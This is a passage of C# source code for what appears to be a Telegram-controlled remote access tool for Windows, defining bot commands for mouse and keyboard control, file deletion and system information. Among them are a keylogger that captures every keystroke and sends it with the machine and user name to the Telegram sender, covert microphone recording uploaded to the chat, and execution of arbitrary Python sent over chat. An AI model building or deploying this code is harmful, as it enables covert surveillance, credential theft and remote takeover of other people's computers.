                                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
                                        break;

                                    case "r":
                                    case "restore":
                                        WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
                                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
                                        break;

                                    case "c":
                                    case "close":
                                        WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_CLOSE, 0);
                                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
                                        break;


                                    default:
                                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "No such usage for /window. Type /help window for info.", replyToMessageId: model.Message.MessageId);
                                        return;
                                }
                            }
                            else
                            {
                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "Only <i>info</i> usage supports no args", ParseMode.Html, replyToMessageId: model.Message.MessageId);
                            }
                        }
                        catch (Exception ex)
                        {
                            ReportError(model.Message, ex);
                        }
                    });
                }
            });

            //MOVE MOUSE TO COORD
            CommandsList.Add(new BotCommand
            {
                Command = "mouseto",
                CountArgs = 2,
                IgnoreCountArgs = false,
                MayHaveNoArgs = false,

                Description = "Move cursor to coordinate in pixels",
                Example = "/mouseto 200 300 (width heght)",

                Execute = model =>
                {
                    MouseSimulator mouseSimulator = new MouseSimulator(new InputSimulator());

                    try
                    {
                        mouseSimulator.MoveMouseTo(Convert.ToDouble(model.Args[0]) * (ushort.MaxValue / WinAPI.GetScreenBounds().Width),
                            Convert.ToDouble(model.Args[1]) * (ushort.MaxValue / WinAPI.GetScreenBounds().Height));
                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);

                    }
                    catch (Exception ex)
                    {
                        ReportError(model.Message, ex);
                    }
                }
            });

            //MOVE MOUSE BY PIXELS
            CommandsList.Add(new BotCommand
            {
                Command = "mouseby",
                CountArgs = 2,
                IgnoreCountArgs = false,
                MayHaveNoArgs = false,
                Description = "Move cursor by pixels.",
                Example = "/mouseby 15 20",
                Execute = model =>
                {
                    MouseSimulator mouseSimulator = new MouseSimulator(new InputSimulator());
                    try
                    {
                        mouseSimulator.MoveMouseBy(Convert.ToInt32(model.Args[0]),
                            Convert.ToInt32(model.Args[1]));
                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
                    }
                    catch (Exception ex)
                    {
                        ReportError(model.Message, ex);
                    }
                }
            });

            //CLICK LEFT MOUSE BUTTON
            CommandsList.Add(new BotCommand
            {
                Command = "lmclick",
                Description = "Simulate left mouse click.",
                Execute = model =>
                {
                    new MouseSimulator(new InputSimulator()).LeftButtonClick();
                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
                }
            });

            //DOUBLECLICK LEFT MOUSE BUTTON
            CommandsList.Add(new BotCommand
            {
                Command = "dlmclick",
                Description = "Simulate double left mouse click.",
                Execute = model =>
                {
                    new MouseSimulator(new InputSimulator()).LeftButtonDoubleClick();
                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
                }
            });

            //CLICK RIGHT MOUSE BUTTON
            CommandsList.Add(new BotCommand
            {
                Command = "rmclick",
                Description = "Simulate right mouse click.",
                Execute = model =>
                {
                    new MouseSimulator(new InputSimulator()).RightButtonClick();
                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
                }
            });

            //SEND TEXT INPUT
            CommandsList.Add(new BotCommand
            {
                Command = "sendtext",
                IgnoreCountArgs = true,
                MayHaveNoArgs = false,
                Description = "Send text input",
                Example = "/sendtext hello world",
                Execute = model =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            new KeyboardSimulator(new InputSimulator()).TextEntry(model.RawArgs);
                            Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
                        }
                        catch (Exception ex)
                        {
                            ReportError(model.Message, ex);
                        }
                    });
                }
            });

            //KEYLOG
            CommandsList.Add(new BotCommand
            {
                Command = "keylog",

                Description = "Keylog starts and ends with no args.",
                Execute = model =>
                {
                    Task.Run(() =>
                    {
                        if (keylog)
                        {
                            keylog = false;
                            return;
                        }
                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Keylog started!", replyToMessageId: model.Message.MessageId);
                        keylog = true;

                        StringBuilder mappedKeys = new StringBuilder();
                        StringBuilder unmappedKeys = new StringBuilder();
                        List<uint> LastKeys = new List<uint>();
                        List<uint> shit = new List<uint>();
                        while (keylog)
                        {
                            shit.Clear();
                            bool hasAtLeastOneKey = false;
                            for (uint i = 0; i < 256; i++)
                            {
                                int state = WinAPI.GetAsyncKeyState(i);
                                if (state != 0)
                                {
                                    shit.Add(i);
                                    hasAtLeastOneKey = true;
                                }
                            }
                            if (!hasAtLeastOneKey && LastKeys.Count > 0)
                            {
                                char mappedKeycode = WinAPI.MapVirtualKey(LastKeys[0]);
                                for (int i = 0; i < LastKeys.Count; i++)
                                {
                                    mappedKeycode = WinAPI.MapVirtualKey(LastKeys[i]);
                                    if ((int)mappedKeycode == 0)
                                        mappedKeys.Append(LastKeys[i].ToString() + ";");
                                    else
                                        mappedKeys.Append(mappedKeycode + ";");

                                    unmappedKeys.Append(LastKeys[i].ToString("X") + ";");
                                }
                                mappedKeys.Append(" ");
                                unmappedKeys.Append(" ");
                                LastKeys.Clear();
                                continue;
                            }
                            foreach (uint v in shit)
                            {
                                if (!LastKeys.Contains(v))
                                {
                                    LastKeys.Add(v);
                                }
                            }

                        }
                        using (FileStream keylogFileStream = System.IO.File.Create("keylog.txt"))
                        {
                            StreamWriter streamWriter = new StreamWriter(keylogFileStream);
                            streamWriter.WriteLine("#Mapped keylog:");
                            streamWriter.WriteLine(mappedKeys.ToString());
                            streamWriter.WriteLine("\n#Remember, mapped keylog is not the \"clear\" input.\n\n#Unmapped keylog:");
                            streamWriter.WriteLine(unmappedKeys.ToString());
                            streamWriter.WriteLine("\n#Keycodes table - https://docs.microsoft.com/ru-ru/windows/win32/inputdev/virtual-key-codes");
                            streamWriter.Close();
                        }
                        Bot.SendTextMessageAsync(model.Message.From.Id, "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName + ": \n" + mappedKeys.ToString());

                        using (FileStream fs = new FileStream("keylog.txt", FileMode.Open))
                        {
                            Bot.SendDocumentAsync(model.Message.From.Id, new InputOnlineFile(fs), caption: "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName).Wait();
                        }
                    });
                }
            });

            //RECORD AUDIO
            CommandsList.Add(new BotCommand
            {
                Command = "audio",
                CountArgs = 1,
                Description = "Record audio from microphone for given amount of secs.",
                Example = "/audio 50",
                Execute = model =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            if (WaveIn.DeviceCount == 0)
                            {
                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "This machine has no audio input devices, the recording isn't possible.", replyToMessageId: model.Message.MessageId);
                                return;
                            }

                            uint recordLength;

                            if (uint.TryParse(model.Args[0], out recordLength) is false)
                            {
                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "Argument must be a positive integer!", replyToMessageId: model.Message.MessageId);
                                return;
                            }

                            WaveInEvent waveIn2 = new WaveInEvent();

                            waveIn2.WaveFormat = new WaveFormat(44100, 1);
                            MemoryStream memstrm = new MemoryStream();
                            WaveFileWriter waveFileWriter2 = new WaveFileWriter(memstrm, waveIn2.WaveFormat);

                            waveIn2.DataAvailable += new EventHandler<WaveInEventArgs>((sender, args) =>
                            {
                                if (waveFileWriter2 != null)
                                {
                                    waveFileWriter2.Write(args.Buffer, 0, args.BytesRecorded);
                                    waveFileWriter2.Flush();
                                }
                            });

                            waveIn2.StartRecording();
                            Bot.SendTextMessageAsync(model.Message.Chat.Id, "Start recording", replyToMessageId: model.Message.MessageId);

                            Task.Delay((int)recordLength * 1000).Wait();

                            waveIn2.StopRecording();

                            memstrm.Position = 0;

                            Bot.SendAudioAsync(model.Message.Chat.Id, new InputOnlineFile(memstrm, fileName: "record"), replyToMessageId: model.Message.MessageId).Wait();

                            waveIn2.Dispose();
                            memstrm.Close();

                        }
                        catch (Exception ex)
                        {
                            ReportError(model.Message, ex);
                        }

                    });
                }
            });

            //GET ALL COMMANDS
            CommandsList.Add(new BotCommand
            {
                Command = "commands",
                Description = "Get all commands list sorted by alphabet",
                Execute = model =>
                {
                    Task.Run(() =>
                    {
                        StringBuilder commandsList = new StringBuilder("List of all commands:\n\n");
                        foreach (BotCommand command in commands.OrderBy(x => x.Command))
                        {
                            commandsList.AppendLine("/" + command.Command);
                        }
                        commandsList.AppendLine("\nHold to copy command");
                        Bot.SendTextMessageAsync(model.Message.Chat.Id, commandsList.ToString(), replyToMessageId: model.Message.MessageId);

                    });
                }
            });

            //DELETE FILE
            CommandsList.Add(new BotCommand
            {
                Command = "deletefile",
                MayHaveNoArgs = false,
                Description = "Delete file in path",
                Example = "/deletefile hello world.txt",
                Execute = model =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            if (System.IO.File.Exists(model.RawArgs))
                            {
                                System.IO.File.Delete(model.RawArgs);
                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
                            }
                            else
                            {
                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "This file does not exist.", replyToMessageId: model.Message.MessageId);
                            }
                        }
                        catch (Exception e)
                        {
                            ReportError(model.Message, e);
                        }
                    });
                }
            });

            //CREATE FOLDER
            CommandsList.Add(new BotCommand
            {
                Command = "createfolder",
                MayHaveNoArgs = false,
                Description = "Create folder.",
                Example = "/createfolder C:\\Users\\User\\Documents\\NewFolder",
                Execute = model =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            if (!Directory.Exists(model.RawArgs))
                            {
                                Directory.CreateDirectory(model.RawArgs);
                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
                            }
                            else
                            {
                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "This folder already exists!", replyToMessageId: model.Message.MessageId);
                            }
                        }
                        catch (Exception e)
                        {
                            ReportError(model.Message, e);
                        }
                    });
                }
            });

            //DELETE FOLDER
            CommandsList.Add(new BotCommand
            {
                Command = "deletefolder",
                MayHaveNoArgs = false,
                Description = "Delete folder.",
                Example = "/deletefolder C:\\Users\\User\\Desktop\\My Folder",
                Execute = model =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            if (Directory.Exists(model.RawArgs))
                            {
                                Directory.Delete(model.RawArgs);
                            }
                            else
                            {
                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "This folder does not exist!", replyToMessageId: model.Message.MessageId);
                            }
                        }
                        catch (Exception e)
                        {
                            ReportError(model.Message, e);
                        }
                    });
                }
            });

            //RENAME FILE
            CommandsList.Add(new BotCommand
            {
                Command = "renamefile",
                Description = "Rename file. First argument must be path (full or relative) for file. Second argument must contain only new name.",
                Example = "/renamefile \"C:\\Users\\User\\Documents\\Old Name.txt\" \"New Name.txt\"",
                Execute = model =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            if (System.IO.File.Exists(model.Args[0]) && !System.IO.File.Exists($"{Path.GetDirectoryName(model.Args[0])}\\{model.Args[1]}"))
                            {
                                string fileToRename = Path.GetFullPath(model.Args[0]);
                                string newFileName = $"{Path.GetDirectoryName(fileToRename)}\\{model.Args[1]}";
                                System.IO.File.Move(fileToRename, newFileName);
                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
                            }
                            else
                            {
                                if (!System.IO.File.Exists(model.Args[0]))
                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "This file does not exist!", replyToMessageId: model.Message.MessageId);
                                if (System.IO.File.Exists($"{Path.GetDirectoryName(model.Args[0])}\\{model.Args[1]}"))
                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "There is a file with the same name!", replyToMessageId: model.Message.MessageId);
                            }
                        }
                        catch (Exception ex)
                        {
                            ReportError(model.Message, ex);
                        }
                    });
                }
            });

            //COPY FILE
            CommandsList.Add(new BotCommand
            {
                Command = "copyfile",
                CountArgs = 2,
                Description = "Copy file. First argument is file path (full or realtive), second is folder path. Type paths as in cmd.",
                Example = "/copyfile \"My folder\\hello world.txt\" \"C:\\Users\\User\\Documents\\Some Folder\"",
                Execute = model =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            if (System.IO.File.Exists(model.Args[0]) && Directory.Exists(model.Args[1]))
                            {
                                System.IO.File.Copy(model.Args[0], $"{model.Args[1]}\\{Path.GetFileName(model.Args[1])}");
                            }
                            else
                            {
                                if (!System.IO.File.Exists(model.Args[0]))
                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "This file does not exist!", replyToMessageId: model.Message.MessageId);
                                if (!Directory.Exists(model.Args[1]))
                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "This path does not exist!", replyToMessageId: model.Message.MessageId);
                            }
                        }
                        catch (Exception ex)
                        {
                            ReportError(model.Message, ex);
                        }
                    });
                }
            });

            //PYTHON COMMANDS EXECUTING
            CommandsList.Add(new BotCommand
            {
                Command = "py",
                Description = "Execute python expression or file. To execute file attach it to message or send it and reply to it with command /py. Mind that all expressions and files execute in the same script scope. To clear scope /pyclearscope",
                Example = "/py print('Hello World')",
                Execute = model =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            if (model.Message.Type == MessageType.Document)
                            {
                                if (!model.Message.Document.FileName.Contains(".py"))
                                {
                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "This is not a python script!", replyToMessageId: model.Message.MessageId);
                                    return;
                                }
                                MemoryStream outputStream = new MemoryStream();
                                var scriptFileStream = System.IO.File.Create("UserScript.py");
                                pythonEngine.Runtime.IO.SetOutput(outputStream, Encoding.UTF8);

                                var file = Bot.GetFileAsync(model.Message.Document.FileId).Result;
                                Bot.DownloadFileAsync(file.FilePath, scriptFileStream).Wait();
                                scriptFileStream.Close();

                                pythonEngine.ExecuteFile("UserScript.py", pythonScope);

                                outputStream.Position = 0;

                                string outputText = string.Join(string.Empty, new StreamReader(outputStream).ReadToEnd().Take(4096));

                                if (outputText.Length > 0)
                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, $"Executed! Output: {outputText}", replyToMessageId: model.Message.MessageId);
                                else
                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, $"Executed!", replyToMessageId: model.Message.MessageId);

                                System.IO.File.Delete("UserScript.py");
                                outputStream.Close();
                                return;
                            }
                            if (model.Message.ReplyToMessage != null && model.Message.ReplyToMessage.Type == MessageType.Document)
                            {
                                if (!model.Message.ReplyToMessage.Document.FileName.Contains(".py"))
                                {
                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "This is not a python script!", replyToMessageId: model.Message.MessageId);
                                    return;
                                }
                                MemoryStream outputStream = new MemoryStream();
                                var scriptFileStream = System.IO.File.Create("UserScript.py");
                                pythonEngine.Runtime.IO.SetOutput(outputStream, Encoding.UTF8);

                                var file = Bot.GetFileAsync(model.Message.ReplyToMessage.Document.FileId).Result;
                                Bot.DownloadFileAsync(file.FilePath, scriptFileStream).Wait();
                                scriptFileStream.Close();

                                pythonEngine.ExecuteFile("UserScript.py", pythonScope);

                                outputStream.Position = 0;

                                string outputText = string.Join(string.Empty, new StreamReader(outputStream).ReadToEnd().Take(4096));


                                if (outputText.Length > 0)
                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, $"Executed! Output: {outputText}", replyToMessageId: model.Message.MessageId);
                                else
                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, $"Executed!", replyToMessageId: model.Message.MessageId);

                                System.IO.File.Delete("UserScript.py");
                                outputStream.Close();
                                return;
                            }


                            if (model.Args.Length < 1)
                            {
                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "Need an expression or file to execute", replyToMessageId: model.Message.MessageId);
                                return;
                            }
                            MemoryStream pyOutput = new MemoryStream();
                            var pyStream = new MemoryStream();
                            pythonEngine.Runtime.IO.SetOutput(pyStream, Encoding.UTF8);

                            pythonEngine.Execute(model.RawArgs, pythonScope);
                            pyStream.Position = 0;

                            if (pyStream.Length > 0)
                            {
                                string output = string.Join(string.Empty, new StreamReader(pyStream).ReadToEnd().Take(4096).ToArray());
                                Bot.SendTextMessageAsync(model.Message.Chat.Id, $"Executed! Output:\n{output}", replyToMessageId: model.Message.MessageId);
                            }
                            else
                            {
                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "Executed!", replyToMessageId: model.Message.MessageId);
                            }
                            pyStream.Close();

                        }
                        catch (Exception ex)
                        {
                            ReportError(model.Message, ex);
                        }

                    });
                }
            });

            //PYTHON CLEAR SCOPE
            CommandsList.Add(new BotCommand
            {
                Command = "pyclearscope",
                CountArgs = 0,
                Description = "Clear python execution scope.",
                Execute = model =>
                {
                    Task.Run(() =>
                    {
                        pythonScope = pythonEngine.CreateScope();
                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Cleared!", replyToMessageId: model.Message.MessageId);
                    });
                }

            });

            //MONITOR OFF/ON
            CommandsList.Add(new BotCommand
            {
                Command = "monitor",
                CountArgs = 1,

                Description = "Turn monitor off or on",
                Example = "/monitor off",
                Execute = model =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            switch (model.Args[0])
                            {
                                case "off":
                                    bool status = WinAPI.PostMessage(WinAPI.GetForegroundWindow(), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MONITORPOWER, 2);
                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, status ? "Monitor turned off" : "Failed", replyToMessageId: model.Message.MessageId);
                                    break;

                                case "on":
                                    new MouseSimulator(new InputSimulator()).MoveMouseBy(0, 0);
                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "Monitor turned on", replyToMessageId: model.Message.MessageId);
                                    break;

                                default:
                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "Type off or on. See help - /help monitor", replyToMessageId: model.Message.MessageId); ;
                                    break;
                            }

                        }
                        catch (Exception ex)
                        {
                            ReportError(model.Message, ex);
                        }
                    });
                }
            });

            //GET LOGICAL DRIVES
            CommandsList.Add(new BotCommand
            {
                Command = "drives",
                CountArgs = 0,
                Description = "Show all logical drives on this computer.",
                Example = "/drives",
                Execute = model =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            DriveInfo[] drives = DriveInfo.GetDrives();
                            StringBuilder drivesStr = new StringBuilder();
                            foreach (DriveInfo drive in drives)
                            {
                                drivesStr.Append(
                                    $"Name: {drive.Name}\n" +
                                    $"IsReady: {drive.IsReady}\n");
                                if (drive.IsReady)
                                {
                                    drivesStr.Append(
                                    $"Label: {drive.VolumeLabel}\n" +
                                    $"Type: {drive.DriveType}\n" +
                                    $"Format: {drive.DriveFormat}\n\n");
                                }
                                else
                                {
                                    drivesStr.AppendLine();
                                }
                            }
                            Bot.SendTextMessageAsync(model.Message.Chat.Id, string.Join(string.Empty, drivesStr.ToString().Take(4096).ToArray()), ParseMode.Html, replyToMessageId: model.Message.MessageId);
                        }
                        catch (Exception ex)
                        {
                            ReportError(model.Message, ex);
                        }

                    });
                }
            });

            //PING 
            CommandsList.Add(new BotCommand
            {
                Command = "ping",

                Description = "Ping bot to check if it's work",
                Execute = model =>
                {
                    Task.Run(() =>
                    {
                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Ping!", replyToMessageId: model.Message.MessageId); ;
                    });
                }
            });

            //REPEAT
            CommandsList.Add(new BotCommand
            {
                Command = "repeat",

                Description = "Repeat command by replying to a message",

                Execute = model =>
                {
                    if (model.Message.ReplyToMessage == null)
                    {
                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Reply to message", replyToMessageId: model.Message.MessageId);
                        return;
                    }
                    BotCommandModel newmodel = BotCommandModel.FromMessage(model.Message.ReplyToMessage, string.Empty);

                    if (newmodel == null)
                    {
                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Unable to repeat command from this message");
                        return;
                    }

                    var cmd = CommandsList.Find(command => command.Command == newmodel.Command);

                    if (ValidateModel(cmd, newmodel))
                        cmd.Execute(newmodel);
                    else
                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Unable to repeat command from this message");
                }
            });

            //INFO
            CommandsList.Add(new BotCommand
            {
                Command = "info",

                Description = "Get info about environment and this program process",
                Execute = model =>
                {
                    string sysInfo =
                    $"User name: {Environment.UserName}\n" +
                    $"PC name: {Environment.MachineName}\n\n" +

                    $"OS: {GetWindowsVersion()}({(Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit")})\n" +
                    $"NT version: {Environment.OSVersion.Version}\n" +
                    $"Process: {(Environment.Is64BitProcess ? "64-bit" : "32-bit")}\n";
                    

                    Bot.SendTextMessageAsync(model.Message.Chat.Id, sysInfo, replyToMessageId: model.Message.MessageId);
                }
            });

        }

    }
}
